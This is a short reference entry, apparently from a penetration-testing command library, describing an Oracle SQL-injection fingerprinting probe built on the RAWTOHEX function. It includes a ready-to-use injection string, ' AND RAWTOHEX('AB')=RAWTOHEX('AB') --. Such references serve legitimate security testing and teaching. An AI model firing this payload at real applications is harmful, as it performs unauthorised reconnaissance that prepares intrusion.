---
type: command
executor: sql
data: RAWTOHEX('AB')=RAWTOHEX('AB')
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Database
tags:
  - sql-injection
  - fingerprinting
verified: true
validated: true
---

# oracle-rawtohex-test

## Command

```sql
RAWTOHEX('AB')=RAWTOHEX('AB')
```

## Description

Uses Oracle's RAWTOHEX function to convert RAW to hex string for fingerprinting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Fixed | N/A |

## Examples

### Basic Usage

`' AND RAWTOHEX('AB')=RAWTOHEX('AB') --`

## Expected Output

True if Oracle.

## Related

- [[procedures/DBMS-Fingerprinting-via-SQL-Injection]]
- [[commands/oracle-rownum-test]]
